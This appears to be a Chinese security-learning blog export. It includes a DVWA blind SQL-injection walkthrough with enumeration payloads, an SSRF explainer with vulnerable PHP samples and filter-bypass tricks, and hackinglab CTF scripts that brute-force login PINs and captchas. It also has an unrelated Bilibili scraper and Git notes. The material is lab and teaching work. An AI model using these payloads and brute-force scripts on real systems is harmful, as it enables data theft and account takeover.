1’ and length(database())&lt;5# User ID exists in the database. 1’ and length(database())&lt;3# User ID is MISSING from the database. 1’ and length(database())=4# User ID exists in the database. 说明数据库名长度为4 猜解数据库名利用substr()函数和ascii()函数进行猜解数据库名substr(string, start, length) payload 结果 1’ and ascii(substr(database(),1,1))&gt;97# User ID is MISSING from the database. 1’ and ascii(substr(database(),1,1))&lt;122# User ID is MISSING from the database. 1’ and ascii(substr(database(),1,1))&lt;109# User ID is MISSING from the database. 1’ and ascii(substr(database(),1,1))&lt;103# User ID is MISSING from the database. 1’ and ascii(substr(database(),1,1))&lt;100# User ID is MISSING from the database. 1’ and ascii(substr(database(),1,1))=100# User ID exists in the database. 猜解出数据库名的第一个字符为ascii码为100的字符 d 循环上述操作，最终猜解出数据库名dvwa 猜解表名 猜解表的数量最终返回exist的payload 1&#39; and (select count(table_name) from information_schema.tables where table_schema=&#39;dvwa&#39;)=2#猜解出有两个表 猜解表名长度猜解出第一个表名的长度payload 1&#39; and length(substr((select table_name from information_schema.tables where table_schema=&#39;dvwa&#39; limit 1),1))=9#猜解出第二个表名的长度payload 1&#39; and length(substr((select table_name from information_schema.tables where table_schema=&#39;dvwa&#39; limit 1,1),1))=5# 猜解表名猜解第一个表名1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97#……循环猜解得到第一个表名为guestbook猜解第二个表名1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))&gt;97#……循环猜解得到第二个表名为users 猜解列名 猜解列数量payload 1&#39; and (select count(column_name) from information_schema.columns where table_name=&#39;users&#39;)=11# 猜解列长度payload 1&#39; and length(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1))=7#……循环猜解出每个列名的长度 猜解列名payload 1&#39; and ascii(strsub((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 3,1),1,1))&gt;1#得到列名 user_id,first_name,last_name,user,password,avatar,last_login,failed_login,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS猜解数据payload 1&#39; and ascii(substr((select user from dvwa.users where user_id=1),1,1))&gt;1#循环查询user和password的值 Medium Level总体思路和Low没什么区别思路:bp抓包提交payload，循环爆破数据库名，表名，列名，字段值注意点:数字型的盲注，需要16进制绕过对引号的转义 High Level思路和Low也没什么区别思路:构造payload，循环爆破数据库名，表名，列名，字段值注意点:字符型的盲注，可能需要用#注释掉 LIMIT 语句的限制，程序中添加了随机的sleep()函数，会使得基于时间的盲注受到干扰 相关链接:关于SQL基本增删改查关于SQL注入的常见方式SQL手注dvwa基于时间的盲注]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ssrf漏洞解析]]></title>
    <url>%2F2019%2F03%2F17%2Fssrf%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%2F</url>
    <content type="text"><![CDATA[SSRF 简介SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。(正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统)SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。 攻击者可以利用 SSRF 实现的攻击主要有 5 种: 可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息 攻击运行在内网或本地的应用程序(比如溢出) 对内网 WEB 应用进行指纹识别，通过访问默认文件实现 攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击(比如 Struts2，sqli 等) 利用 file 协议读取本地文件等 上面的话说的有点抽象，然后说一下网上大佬的理解首先，我们要对目标网站的架构了解，脑子了要有一个架构图。比如 : A网站，是一个所有人都可以访问的外网网站，B网站是一个他们内部的OA网站。所以，我们普通用户只可以访问a网站，不能访问b网站。但是我们可以同过a网站做中间人，访问b网站，从而达到攻击b网站需求。正常用户访问网站的流程是:输入A网站URL –&gt; 发送请求 –&gt; A服务器接受请求(没有过滤)，并处理 –&gt;返回用户响应【 那网站有个请求是www.baidu.com/xxx.php?image=URL 】那么产生SSRF漏洞的环节在哪里呢？安全的网站应接收请求后，检测请求的合法性产生的原因:服务器端的验证并没有对其请求获取图片的参数(image=)做出严格的过滤以及限制，导致A网站可以从其他服务器的获取数据例如:www.baidu.com/xxx.php?image=www.abc.com/1.jpg如果我们将www.abd.com/1.jpg 换为与该服务器相连的内网服务器地址会产生什么效果呢？如果存在该内网地址就会返回1xx 2xx 之类的状态码，不存在就会其他的状态码终极简析: SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有检测这个请求是否合法的，然后服务器以他的身份来访问其他服务器的资源。 可能出现的场景 能够对外发起网络请求的地方，就可能存在 SSRF 漏洞 从远程服务器请求资源(Upload from URL，Import &amp; Export RSS Feed) 数据库内置功能(Oracle、MongoDB、MSSQL、Postgres、CouchDB) Webmail 收取其他邮箱邮件(POP3、IMAP、SMTP) 文件处理、编码处理、属性信息处理(ffmpeg、ImageMagic、DOCX、PDF、XML) 可进行利用的协议FILE 读取服务器上任意文件内容 IMAP/IMAPS/POP3SMTP/SMTPS 爆破邮件用户名密码 FTP/FTPS FTP匿名访问、爆破 DICT 操作内网Redis等服务 GOPHER 能够将所有操作转成数据流，并将数据流一次发出去，可以用来探测内网的所有服务的所有漏洞 TFTP UDP协议扩展常见函数file_get_contents()把文件写入字符串，当把url是内网文件的时候，他会先去把这个文件的内容读出来再写入，导致了文件读取 12345678910&lt;?phpif (isset($_POST['url'])) &#123; $content = file_get_contents($_POST['url']); $filename ='./images/'.rand().';img1.jpg'; file_put_contents($filename, $content); echo $_POST['url']; $img = "&lt;img src=\"".$filename."\"/&gt;"; &#125;echo $img;?&gt; fsockopen()打开网络连接或者Unix套接字连接 12345678910111213141516&lt;?php$host=$_GET['url'];$fp = fsockopen("$host", 80, $errno, $errstr, 30);if (!$fp) &#123; echo "$errstr ($errno)&lt;br /&gt;\n";&#125; else &#123; $out = "GET / HTTP/1.1\r\n"; $out .= "Host: $host\r\n"; $out .= "Connection: Close\r\n\r\n"; fwrite($fp, $out); while (!feof($fp)) &#123; echo fgets($fp, 128); &#125; fclose($fp);&#125;?&gt; curl_exec()使用 curl 获取到数据使用 file:// 获取到数据 123456789101112131415&lt;?php if (isset($_POST['url'])) &#123; $link = $_POST['url']; $curlobj = curl_init(); curl_setopt($curlobj, CURLOPT_POST, 0); curl_setopt($curlobj,CURLOPT_URL,$link); curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); $result=curl_exec($curlobj); curl_close($curlobj); $filename = './'.rand().'.txt'; file_put_contents($filename, $result); echo $result;&#125;?&gt; 利用协议利用 file 协议读取文件利用 dict 协议查看端口利用 gopher 协议反弹shell，攻击数据库 常见的过滤方法 对 url 开头进行过滤 对 url 为 ip 格式的连接进行过滤 对 url 结尾进行判定 绕过方法 更改 IP 地址写法 例如192.168.0.1 8 进制格式:0300.0250.0.1 16 进制格式:0xC0.0xA8.0.1 10 进制整数格式:3232235521 16 进制整数格式:0xC0A80001 还有一种特殊的省略模式，例如10.0.0.1这个 IP 可以写成10.1 利用 URL 解析问题 在某些情况下，后端程序可能会对访问的 URL 进行解析，对解析出来的 host 地址进行过滤。这时候可能会出现对 URL 参数解析不当，导致可以绕过过滤。 例如: http://www.baidu.com@192.168.0.1/ 与 http://192.168.0.1 请求的都是 192.168.0.1 的内容 可以指向任意 ip 的域名xip.io:http://127.0.0.1.xip.io/ ==&gt; http://127.0.0.1/ 短地址http://dwz.cn/11SMa ==&gt; http://127.0.0.1 利用句号。:127。0。0。1 ==&gt; 127.0.0.1 利用 Enclosed alphanumerics ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.com List: ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 参考文章:https://xz.aliyun.com/t/2115https://ctf-wiki.github.io/ctf-wiki/web/ssrf/https://www.jianshu.com/p/6bf7700139fahttps://www.jianshu.com/p/d1d1c40f6d4chttps://www.jianshu.com/p/86bb349baac1]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>ssrf</tag>
        <tag>服务端请求伪造</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于Rainmeter的B站每日top100桌面推送!!!]]></title>
    <url>%2F2019%2F03%2F01%2F%E5%9F%BA%E4%BA%8ERainmeter%E7%9A%84B%E7%AB%99%E6%AF%8F%E6%97%A5top100%E6%A1%8C%E9%9D%A2%E6%8E%A8%E9%80%81%2F</url>
    <content type="text"><![CDATA[简介最近在使用Rainmeter，将quotes(桌面箴言)改进了一下，他就有了如下功能！ 获取B站每日top100视频信息 将信息随机展示在桌面quote上(随机展示一条信息，标题限制在20字，自动/手动切换) 双击quote可在浏览器中打开该视频长相如下:然后，这是我的桌面(有些东西不太好，就隐藏了) 实现方案先看下quotes目录下的东西: getmessage.py 这个是一个简单的python爬虫，爬取bilibili的top100信息(所以电脑上要有python3环境，还要有requests和re模块)，代码如下:123456789101112131415161718192021222324252627282930import requestsimport reurl = 'https://www.bilibili.com/ranking' # B站top100网址s = requests.Session()r = s.get(url).content.decode('utf-8') # get请求网址用变量r接收text = re.findall(r'&lt;div class="info"&gt;&lt;a href="//www.bilibili.com/video/.*&lt;/a&gt;&lt;!----&gt;', r) # 正则表达式获取到r中所有视频的所有信息用变量text接收with open('ListOfQuotes.txt', 'w+') as f: # 清空文件 f.write('')f.close()for i in range(len(text)): # 遍历text print(i+1, text[i]) videourl = re.findall(r'//www.bilibili.com/video/.*/"', text[i])[0][:-1] # 正则表达式获取到视频的url，用变量videourl接收 videourl = 'https:' + videourl # 拼接url，使用https协议 print(videourl) message = re.findall(r'e"&gt;.*&lt;/a&gt;', text[i])[0][3:-4] # 正则表达式获取到视频的title，用变量message接收 if len(message) &gt; 20: # 控制下title的长度，这里控制在20个字符，如果超过，用......代替 message = message[:20] + '......' print(message) with open('ListOfQuotes.txt', 'a', encoding='gb18030') as f: # 写入文件，一定要注意编码，因为有些up主会用到特殊符号，gbk编码会出问题！utf-8编码会令quotes读取成乱码！！ # gb18030编码是gbk子集，会将特殊符号显示为??而且quotes显示正常！！ f.write('&lt;quote&gt;[' + str(i+1) + ']' + message + '\n') f.write('&lt;author&gt;' + videourl + '\n') f.close() 将run.vbs添加到开启启动里即可实现开机自动获取 然后quotes调用的lua脚本如下 12345678910111213141516171819202122232425262728293031function Initialize() CURRENTPATH = SKIN:GetVariable('CURRENTPATH') Quotes = &#123;&#125; Authors = &#123;&#125; i = 0 for line in io.lines(CURRENTPATH..'ListOfQuotes.txt') do if string.sub(line, 1, 7) == '&lt;quote&gt;' then i = i + 1 Quotes[i] = string.sub(line, 8) elseif string.sub(line, 1, 8) == '&lt;author&gt;' then Authors[i] = string.sub(line, 9) else Quotes[i] = Quotes[i]..'#CRLF#'..line end end end --&gt;Initializefunction Update() rand = math.random(1, #Quotes) SKIN:Bang('!SetOption', 'MeterQuote', 'Text', Quotes[rand]) SKIN:Bang('!SetOption', 'MeterAuthor', 'Text', Authors[rand]) local f = assert(io.open(CURRENTPATH..'openurl.bat','w+')) f:write('start ', Authors[rand]) f:close() return 'Quote number: '..rand end --&gt;Update 运行流程 run.vbs调用init.bat，init.bat执行编译getmessage.py脚本； 双击桌面quotes拉起main.vbs，main.vbs调用openurl.bat 刷新quotes时会执行quotes的lua脚本，随机从ListOfQuotes.txt文件中读取一条信息，并将视频地址写入到openurl.bat中]]></content>
      <categories>
        <category>spider</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>Rainmeter</tag>
        <tag>lua</tag>
        <tag>spider</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-hackinglab 脚本关(py脚本)]]></title>
    <url>%2F2019%2F02%2F18%2FWriteup%2FWP-hackinglab-%E8%84%9A%E6%9C%AC%E5%85%B3%EF%BC%88py%E8%84%9A%E6%9C%AC%EF%BC%89%2F</url>
    <content type="text"><![CDATA[key又又找不到了点击_到这里找key__后跳转到了没有key的页面，明显的跳转抓下来./search_key.php这个页面就好 123456import requestsssion = requests.Session()url = "http://lab1.xseclab.com/xss1_30ac8668cd453e7e387c76b132b140bb/search_key.php"r = ssion.post(url).content.decode('utf-8')print(r) 快速口算明显的脚本题，直接抓下来然后计算式子就好用到了正则 12345678910import reimport requestsssion = requests.Session()url = 'http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php'head = &#123;'cookie': 'PHPSESSID=e26ab2950d310b1bd6761d85d5ed8353'&#125;r = ssion.post(url,headers=head).content.decode('utf-8')findtext = re.findall('&lt;br/&gt;\s+(.*?)=', r)data = &#123;'v': eval(findtext[0])&#125;print(ssion.post(url, data=data, headers=head).content.decode('utf-8')) 这个题目是空的回答空即可，那就是null 怎么就是不弹出key呢？源码如下: 123456789101112131415161718&lt;script&gt; function alert(a)&#123; return false; &#125; document.write=function()&#123; return false; &#125; function prompt(a)&#123; return false; &#125; var a=function ()&#123; var b=function(p,a,c,k,e,r)&#123;e=function(c)&#123;return(c&lt;a?'':e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))&#125;;if(!''.replace(/^/,String))&#123;while(c--)r[e(c)]=k[c]||e(c);k=[function(e)&#123;return r[e]&#125;];e=function()&#123;return'\\w+'&#125;;c=1&#125;;while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p&#125;('1s(1e(p,a,c,k,e,r)&#123;e=1e(c)&#123;1d(c&lt;a?\'\':e(1p(c/a)))+((c=c%a)&gt;1q?1f.1j(c+1k):c.1n(1o))&#125;;1g(!\'\'.1h(/^/,1f))&#123;1i(c--)r[e(c)]=k[c]||e(c);k=[1e(e)&#123;1d r[e]&#125;];e=1e()&#123;1d\'\\\\w+\'&#125;;c=1&#125;;1i(c--)1g(k[c])p=p.1h(1l 1m(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);1d p&#125;(\'Y(R(p,a,c,k,e,r)&#123;e=R(c)&#123;S(c&lt;a?\\\'\\\':e(18(c/a)))+((c=c%a)&gt;17?T.16(c+15):c.12(13))&#125;;U(!\\\'\\\'.V(/^/,T))&#123;W(c--)r[e(c)]=k[c]||e(c);k=[R(e)&#123;S r[e]&#125;];e=R()&#123;S\\\'\\\\\\\\w+\\\'&#125;;c=1&#125;;W(c--)U(k[c])p=p.V(Z 11(\\\'\\\\\\\\b\\\'+e(c)+\\\'\\\\\\\\b\\\',\\\'g\\\'),k[c]);S p&#125;(\\\'G(B(p,a,c,k,e,r)&#123;e=B(c)&#123;A c.L(a)&#125;;E(!\\\\\\\'\\\\\\\'.C(/^/,F))&#123;D(c--)r[e(c)]=k[c]||e(c);k=[B(e)&#123;A r[e]&#125;];e=B()&#123;A\\\\\\\'\\\\\\\\\\\\\\\\w+\\\\\\\'&#125;;c=1&#125;;D(c--)E(k[c])p=p.C(I J(\\\\\\\'\\\\\\\\\\\\\\\\b\\\\\\\'+e(c)+\\\\\\\'\\\\\\\\\\\\\\\\b\\\\\\\',\\\\\\\'g\\\\\\\'),k[c]);A p&#125;(\\\\\\\'t(h(p,a,c,k,e,r)&#123;e=o;n(!\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\'.m(/^/,o))&#123;l(c--)r[c]=k[c]||c;k=[h(e)&#123;f r[e]&#125;];e=h()&#123;f\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\w+\\\\\\\\\\\\\\\'&#125;;c=1&#125;;l(c--)n(k[c])p=p.m(q s(\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\b\\\\\\\\\\\\\\\'+e(c)+\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\b\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\'g\\\\\\\\\\\\\\\'),k[c]);f p&#125;(\\\\\\\\\\\\\\\'1 3="6";1 4="7";1 5="";8(1 2=0;2&lt;9;2++)&#123;5+=3+4&#125;\\\\\\\\\\\\\\\',j,j,\\\\\\\\\\\\\\\'|u|i|b|c|d|v|x|y|j\\\\\\\\\\\\\\\'.z(\\\\\\\\\\\\\\\'|\\\\\\\\\\\\\\\'),0,&#123;&#125;))\\\\\\\',H,H,\\\\\\\'|||||||||||||||A||B||M||D|C|E|F||I||J|G|N|O||P|Q|K\\\\\\\'.K(\\\\\\\'|\\\\\\\'),0,&#123;&#125;))\\\',X,X,\\\'||||||||||||||||||||||||||||||||||||S|R|V|W|U|T|Y|13|Z|11|14|12|10|19|1a|1b|1c\\\'.14(\\\'|\\\'),0,&#123;&#125;))\',1t,1u,\'|||||||||||||||||||||||||||||||||||||||||||||||||||||1e|1d|1f|1g|1h|1i|1v|1s|1l||1m|1n|1o|1r|1k|1j|1q|1p|1w|1x|1y|1z\'.1r(\'|\'),0,&#123;&#125;))',62,98,'|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||return|function|String|if|replace|while|fromCharCode|29|new|RegExp|toString|36|parseInt|35|split|eval|62|75|53|var|slakfj|teslkjsdflk|for'.split('|'),0,&#123;&#125;); var d=eval(b); alert("key is first 14 chars"+d); &#125; &lt;/script&gt; &lt;a href="javascript:a();"&gt;_点击之后怎么没反应呢？说好的弹窗呢？__&lt;/a&gt; 把这几个函数去掉本地上运行下即可 123456789function alert(a)&#123; return false;&#125;document.write=function()&#123; return false;&#125;function prompt(a)&#123; return false;&#125; 逗比验证码第一期脚本爆破密码(这里验证码有无都可): 123456789101112131415161718import requestscount = 0ssion = requests.Session()url = "http://lab1.xseclab.com//vcode3_9d1ea7ad52ad93c04a837e0808b17097/login.php"head = &#123;'cookie': 'PHPSESSID=cd1c5f7554400cd3978f48d6e5c44c6a'&#125;for num in range(1000, 10000): count += 1 data = &#123;'username': 'admin', 'pwd': num, 'vcode': '', 'submit': 'submit'&#125; r = ssion.post(url, data = data, headers = head).content.decode('utf-8') if 'pwd error' in r: print("[%d]\033[1;31mpwd: error %d\033[0m" % (count, num)) if 'vcode error' in r: print('[%d]\033[1;31mvcode error pwd:%d\033[0m' % (count, num)) if 'error' not in r: print('[%d]\033[1;32mpassword is: %d\033[0m' % (count, num)) print(r) exit(0) 逗比验证码第二期一样的脚本爆破(这里不要填验证码): 1234567891011121314import requestsssion = requests.Session()url = 'http://lab1.xseclab.com/vcode2_a6e6bac0b47c8187b09deb20babc0e85/login.php'head = &#123;'cookie': 'PHPSESSID=e26ab2950d310b1bd6761d85d5ed8353'&#125;for num in range(1000, 10000): data = &#123;'username': 'admin', 'pwd': num, 'vcode': '', 'submit': 'submit'&#125; r = ssion.post(url, data=data, headers=head).content.decode('utf-8') if u'error' in r: print('\r\033[1;31m[-]I\'m trying!!! PROGESS:%d\033[0m' % num, end="") if u'error' not in r: print('\n\033[1;32m[+]Find password! %d\033[0m' % num) print('\033[1;36m', r, '\033[0m') exit(0) 逗比的验证码第三期(SESSION)1234567891011121314import requestsssion = requests.Session()url = 'http://lab1.xseclab.com/vcode3_9d1ea7ad52ad93c04a837e0808b17097/login.php'head = &#123;'cookie': 'PHPSESSID=e26ab2950d310b1bd6761d85d5ed8353'&#125;for num in range(1000, 10000): data = &#123;'username': 'admin', 'pwd': num, 'vcode': '', 'submit': 'submit'&#125; r = ssion.post(url, data=data, headers=head).content.decode('utf-8') if u'error' in r: print('\r\033[1;31m[-]I\'m trying!!! PROGESS:%d\033[0m' % num, end="") if u'error' not in r: print('\n\033[1;32m[+]Find password! %d\033[0m' % num) print('\033[1;36m', r, '\033[0m') exit(0) 逗比的手机验证码获取验证码后提交，发现需要以13388886667提交，那么:获取验证码，提交，bp抓到，改手机号，提交即可 基情燃烧的岁月先爆破验证码: 1234567891011121314import requestsssion = requests.Session()url = 'http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/login.php'head = &#123;'cookie': 'PHPSESSID=e26ab2950d310b1bd6761d85d5ed8353'&#125;for num in range(100, 1000): data = &#123;'username': '13388886666', 'vcode': num, 'Login': 'submit'&#125; r = ssion.post(url, data=data, headers=head).content.decode('utf-8') if u'error' in r: print('\r\033[1;31m[-]I\'m trying!!! PROGESS:%d\033[0m' % num, end="") if u'error' not in r: print('\n\033[1;32m[+]Find vcode! %d\033[0m' % num) print('\033[1;36m', r, '\033[0m') exit(0) 换手机号13399999999继续爆破: 验证码识别查看源码以及提示中可以看到，验证码是三位数100-999查看源码，分析js脚本可得知，每次提交需要点击获取验证码脚本如下: 123456789101112131415161718192021import requestsimport pytesseracturl = 'http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/login.php'urlmobi = 'http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/mobi_vcode.php'imageurl = 'http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/vcode.php'for num in range(100, 1000): s = requests.Session() r = s.post(urlmobi, data=&#123;'getcode': '1', 'mobi': '13388886666'&#125;) r = s.get(imageurl) with open('1.png', 'wb') as f: for i in r.iter_content(chunk_size=1024): if i: f.write(i) text = pytesseract.image_to_string('1.png').replace(' ', '') data = &#123;'username': '13388886666', 'mobi_code': num, 'user_code': text, 'Login': 'submit'&#125; result = s.post(url, data=data).content.decode('utf-8') print(num, text, result) if 'error' not in result: exit() pytesseract识别验证码会有误差，多试几次即可也可使用tesserocr]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>py脚本</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git基本命令]]></title>
    <url>%2F2018%2F11%2F22%2FGit%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[github 仓库本地初始化123456echo "" &gt;&gt; README.mdgit initgit add README.mdgit commit -m "first commit"git remote add origin urlgit push -u origin master git init在本地新建一个repo,进入一个项目目录,执行git init,会初始化一个repo,并在当前文件夹下创建一个.git文件夹.git clone获取一个url对应的远程Git repo, 创建一个local copy. 一般的格式是git clone [url]. clone下来的repo会以url最后一个斜线后面的名称命名,创建一个文件夹,如果想要指定特定的名称,可以git clone [url] newname指定.git status查询repo的状态. git status -s: -s表示short, -s的输出标记会有两列,第一列是对staging区域而言,第二列是对working目录而言.git logshow commit history of a branch. git log --oneline --number: 每条log只显示一行,显示number条. git log --oneline --graph:可以图形化地表示出分支合并历史. git log branchname可以显示特定分支的log. git log --oneline branch1 ^branch2,可以查看在分支1,却不在分支2中的提交.^表示排除这个分支(Window下可能要给^branch2加上引号). git log --decorate会显示出tag信息. git log --author=[author name] 可以指定作者的提交历史. git log --since --before --until --after 根据提交时间筛选log. --no-merges可以将merge的commits排除在外. git log --grep 根据commit信息过滤log: git log --grep=keywords 默认情况下, git log --grep --author是OR的关系,即满足一条即被返回,如果你想让它们是AND的关系,可以加上--all-match的option. git log -S: filter by introduced diff. 比如: git log -SmethodName (注意S和后面的词之间没有等号分隔). git log -p: show patch introduced at each commit. 每一个提交都是一个快照(snapshot),Git会把每次提交的diff计算出来,作为一个patch显示给你看. 另一种方法是git show [SHA]. git log --stat: show diffstat of changes introduced at each commit. 同样是用来看改动的相对信息的,--stat比-p的输出更简单一些.git add在提交之前,Git有一个暂存区(staging area),可以放入新添加的文件或者加入新的改动. commit时提交的改动是上一次加入到staging area中的改动,而不是我们disk上的改动. git add . 会递归地添加当前工作目录中的所有文件.git diff不加参数的git diff: show diff of unstaged changes. 此命令比较的是工作目录中当前文件和暂存区域快照之间的差异,也就是修改之后还没有暂存起来的变化内容. 若要看已经暂存起来的文件和上次提交时的快照之间的差异,可以用: git diff --cached 命令. show diff of staged changes. (Git 1.6.1 及更高版本还允许使用 git diff --staged，效果是相同的). git diff HEAD show diff of all staged or unstated changes. 也即比较woking directory和上次提交之间所有的改动. 如果想看自从某个版本之后都改动了什么,可以用: git diff [version tag] 跟log命令一样,diff也可以加上--stat参数来简化输出. git diff [branchA] [branchB]可以用来比较两个分支. 它实际上会返回一个由A到B的patch,不是我们想要的结果. 一般我们想要的结果是两个分支分开以后各自的改动都是什么,是由命令: git diff [branchA]…[branchB]给出的. 实际上它是:git diff $(git merge-base [branchA] [branchB]) [branchB]的结果.git commit提交已经被add进来的改动. git commit -m “the commit message&quot; git commit -a 会先把所有已经track的文件的改动add进来,然后提交(有点像svn的一次提交,不用先暂存). 对于没有track的文件,还是需要git add一下. git commit --amend 增补提交. 会使用与当前提交节点相同的父节点进行一次新的提交,旧的提交将会被取消.git resetundo changes and commits. 这里的HEAD关键字指的是当前分支最末梢最新的一个提交.也就是版本库中该分支上的最新版本. git reset HEAD: unstage files from index and reset pointer to HEAD 这个命令用来把不小心add进去的文件从staged状态取出来,可以单独针对某一个文件操作: git reset HEAD - - filename, 这个- - 也可以不加. git reset --soft move HEAD to specific commit reference, index and staging are untouched. git reset --hard unstage files AND undo any changes in the working directory since last commit. 使用git reset —hard HEAD进行reset,即上次提交之后,所有staged的改动和工作目录的改动都会消失,还原到上次提交的状态. 这里的HEAD可以被写成任何一次提交的SHA-1. 不带soft和hard参数的git reset,实际上带的是默认参数mixed. 总结: git reset --mixed id,是将git的HEAD变了(也就是提交记录变了),但文件并没有改变，(也就是working tree并没有改变). 取消了commit和add的内容. git reset --soft id. 实际上，是git reset –mixed id 后,又做了一次git add.即取消了commit的内容. git reset --hard id.是将git的HEAD变了,文件也变了. 按改动范围排序如下: soft (commit) &lt; mixed (commit + add) &lt; hard (commit + add + local working)git revert反转撤销提交.只要把出错的提交(commit)的名字(reference)作为参数传给命令就可以了. git revert HEAD: 撤销最近的一个提交. git revert会创建一个反向的新提交,可以通过参数-n来告诉Git先不要提交.git rmgit rm file: 从staging区移除文件,同时也移除出工作目录. git rm --cached: 从staging区移除文件,但留在工作目录中. git rm --cached从功能上等同于git reset HEAD,清除了缓存区,但不动工作目录树.git cleangit clean是从工作目录中移除没有track的文件. 通常的参数是git clean -df: -d表示同时移除目录,-f表示force,因为在git的配置文件中, clean.requireForce=true,如果不加-f,clean将会拒绝执行.git mvgit rm - - cached orig; mv orig new; git add newgit stash把当前的改动压入一个栈. git stash将会把当前目录和index中的所有改动(但不包括未track的文件)压入一个栈,然后留给你一个clean的工作状态,即处于上一次最新提交处. git stash list会显示这个栈的list. git stash apply:取出stash中的上一个项目(stash@{0}),并且应用于当前的工作目录. 也可以指定别的项目,比如git stash apply stash@{1}. 如果你在应用stash中项目的同时想要删除它,可以用git stash pop 删除stash中的项目: git stash drop: 删除上一个,也可指定参数删除指定的一个项目. git stash clear: 删除所有项目.git branchgit branch可以用来列出分支,创建分支和删除分支. git branch -v可以看见每一个分支的最后一次提交. git branch: 列出本地所有分支,当前分支会被星号标示出. git branch (branchname): 创建一个新的分支(当你用这种方式创建分支的时候,分支是基于你的上一次提交建立的). git branch -d (branchname): 删除一个分支. 删除remote的分支: git push (remote-name) :(branch-name): delete a remote branch. 这个是因为完整的命令形式是: git push remote-name local-branch:remote-branch 而这里local-branch的部分为空,就意味着删除了remote-branchgit checkout git checkout (branchname) 切换到一个分支. git checkout -b (branchname): 创建并切换到新的分支. 这个命令是将git branch newbranch和git checkout newbranch合在一起的结果. checkout还有另一个作用:替换本地改动: git checkout --&lt;filename&gt; 此命令会使用HEAD中的最新内容替换掉你的工作目录中的文件.已添加到暂存区的改动以及新文件都不会受到影响. 注意:git checkout filename会删除该文件中所有没有暂存和提交的改动,这个操作是不可逆的.git merge把一个分支merge进当前的分支. git merge [alias]/[branch] 把远程分支merge到当前分支. 如果出现冲突,需要手动修改,可以用git mergetool. 解决冲突的时候可以用到git diff,解决完之后用git add添加,即表示冲突已经被resolved.git tagtag a point in history as import. 会在一个提交上建立永久性的书签,通常是发布一个release版本或者ship了什么东西之后加tag. 比如: git tag v1.0 git tag -a v1.0, -a参数会允许你添加一些信息,即make an annotated tag. 当你运行git tag -a命令的时候,Git会打开一个编辑器让你输入tag信息. 